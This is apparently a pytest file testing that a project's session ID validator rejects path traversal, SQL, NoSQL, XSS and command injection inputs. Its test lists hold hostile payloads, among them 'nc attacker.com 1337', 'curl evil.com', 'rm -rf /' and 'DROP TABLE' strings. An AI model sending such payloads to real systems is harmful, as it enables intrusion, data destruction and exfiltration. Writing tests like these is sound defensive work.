"""Tests for session ID validation security hardening

These tests verify that the session ID validation properly prevents:
- Path traversal attacks
- SQL injection attempts
- Command injection attempts
- NoSQL injection attempts
- XSS attempts
"""

import pytest

from masterclaw_core.security import validate_session_id, is_valid_session_id, VALID_SESSION_ID_PATTERN


class TestSessionIdValidation:
    """Test suite for session ID validation security hardening"""
    
    def test_valid_session_ids(self):
        """Test that valid session IDs pass validation"""
        valid_ids = [
            "abc123",
            "session_123",
            "my-session",
            "a",
            "A1B2C3",
            "user_123_session_456",
            "a" * 64,  # Max length
        ]
        
        for session_id in valid_ids:
            result = validate_session_id(session_id)
            assert result == session_id
    
    def test_empty_session_id(self):
        """Test that empty session ID raises ValueError"""
        with pytest.raises(ValueError) as exc_info:
            validate_session_id("")
        
        assert "empty" in str(exc_info.value).lower() or "required" in str(exc_info.value).lower()
    
    def test_none_session_id(self):
        """Test that None session ID raises ValueError"""
        with pytest.raises(ValueError) as exc_info:
            validate_session_id(None)
        
        assert "required" in str(exc_info.value).lower()
    
    def test_non_string_session_id(self):
        """Test that non-string session ID raises ValueError"""
        with pytest.raises(ValueError) as exc_info:
            validate_session_id(123)
        
        assert "string" in str(exc_info.value).lower()
        
        with pytest.raises(ValueError) as exc_info:
            validate_session_id(["list"])
        
        assert "string" in str(exc_info.value).lower()
    
    def test_session_id_too_long(self):
        """Test that session ID over 64 chars raises ValueError"""
        with pytest.raises(ValueError) as exc_info:
            validate_session_id("a" * 65)
        
        assert "length" in str(exc_info.value).lower() or "64" in str(exc_info.value)
    
    def test_session_id_with_path_traversal(self):
        """Test that path traversal in session ID raises ValueError"""
        malicious_ids = [
            "../etc/passwd",
            "..\\windows\\system32",
            "session/../other",
            "..hidden",
            "path/subpath",
            "path\\subpath",
        ]
        
        for session_id in malicious_ids:
            with pytest.raises(ValueError) as exc_info:
                validate_session_id(session_id)
            
            assert "path traversal" in str(exc_info.value).lower() or "invalid" in str(exc_info.value).lower()
    
    def test_session_id_with_special_characters(self):
        """Test that special characters in session ID raises ValueError"""
        malicious_ids = [
            "session;rm -rf /",
            "session|cat /etc/passwd",
            "session`whoami`",
            "session$(echo hacked)",
            "session\nnewlines",
            "session\ttabs",
            "session@symbol",
            "session#hash",
            "session$variable",
            "session&ampersand",
            "session*asterisk",
            "session(paren)",
            "session[bracket]",
            "session{brace}",
            "session<less>",
            "session>greater",
            "session=equals",
            "session+plus",
            "session?question",
            "session!exclaim",
            "session'quote",
            'session"double',
            "session.dot",  # Dots should be rejected
            "session space",
        ]
        
        for session_id in malicious_ids:
            with pytest.raises(ValueError) as exc_info:
                validate_session_id(session_id)
            
            assert exc_info.value is not None  # Just verify it raises
    
    def test_session_id_unicode(self):
        """Test that unicode characters in session ID raises ValueError"""
        with pytest.raises(ValueError) as exc_info:
            validate_session_id("sessão")
        
        assert "invalid" in str(exc_info.value).lower()
    
    def test_session_id_null_byte(self):
        """Test that null byte in session ID raises ValueError"""
        with pytest.raises(ValueError) as exc_info:
            validate_session_id("session\x00null")
        
        assert exc_info.value is not None
    
    def test_valid_session_id_pattern(self):
        """Test the VALID_SESSION_ID_PATTERN regex directly"""
        # Should match
        assert VALID_SESSION_ID_PATTERN.match("abc123")
        assert VALID_SESSION_ID_PATTERN.match("my-session_123")
        assert VALID_SESSION_ID_PATTERN.match("A_B-C")
        
        # Should not match
        assert not VALID_SESSION_ID_PATTERN.match("abc.123")  # Dot
        assert not VALID_SESSION_ID_PATTERN.match("abc 123")  # Space
        assert not VALID_SESSION_ID_PATTERN.match("abc/123")  # Slash
        assert not VALID_SESSION_ID_PATTERN.match("")  # Empty
        assert not VALID_SESSION_ID_PATTERN.match("a" * 65)  # Too long
        assert not VALID_SESSION_ID_PATTERN.match("session@email")  # @ symbol


class TestIsValidSessionId:
    """Test suite for is_valid_session_id convenience function"""
    
    def test_valid_returns_true(self):
        """Test that valid session IDs return True"""
        assert is_valid_session_id("valid-id") is True
        assert is_valid_session_id("abc123") is True
        assert is_valid_session_id("user_session") is True
    
    def test_invalid_returns_false(self):
        """Test that invalid session IDs return False"""
        assert is_valid_session_id("../etc/passwd") is False
        assert is_valid_session_id("session;command") is False
        assert is_valid_session_id("") is False
        assert is_valid_session_id(None) is False
        assert is_valid_session_id(123) is False


class TestSessionIdSecurityScenarios:
    """Security-focused test scenarios for session ID validation"""
    
    def test_sql_injection_attempt(self):
        """Test that SQL injection patterns are rejected"""
        sql_injection_attempts = [
            "session'; DROP TABLE memories; --",
            "session' OR '1'='1",
            "session'; DELETE FROM sessions; --",
            "session\"; INSERT INTO users",
        ]
        
        for attempt in sql_injection_attempts:
            with pytest.raises(ValueError):
                validate_session_id(attempt)
    
    def test_command_injection_attempt(self):
        """Test that command injection patterns are rejected"""
        command_injection_attempts = [
            "session; cat /etc/passwd",
            "session && rm -rf /",
            "session | nc attacker.com 1337",
            "session`curl evil.com`",
            "session$(wget malicious.sh)",
        ]
        
        for attempt in command_injection_attempts:
            with pytest.raises(ValueError):
                validate_session_id(attempt)
    
    def test_nosql_injection_attempt(self):
        """Test that NoSQL injection patterns are rejected"""
        nosql_attempts = [
            '{"$gt": ""}',
            '{"$ne": null}',
            '{"$where": "this.password.length > 0"}',
        ]
        
        for attempt in nosql_attempts:
            with pytest.raises(ValueError):
                validate_session_id(attempt)
    
    def test_xss_attempt(self):
        """Test that XSS patterns are rejected"""
        xss_attempts = [
            "<script>alert('xss')</script>",
            "session<img src=x onerror=alert(1)>",
            "session'onmouseover='alert(1)",
            "session\\\" onfocus=alert(1) autofocus=\\\"",
        ]
        
        for attempt in xss_attempts:
            with pytest.raises(ValueError):
                validate_session_id(attempt)
    
    def test_directory_traversal_variants(self):
        """Test various directory traversal patterns are rejected"""
        traversal_attempts = [
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
            "..\\..\\..\\windows\\system32",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
            "..%2f..%2f..%2fetc/passwd",
            ".../.../.../etc/passwd",
            "session/../../../etc/passwd",
        ]
        
        for attempt in traversal_attempts:
            with pytest.raises(ValueError):
                validate_session_id(attempt)
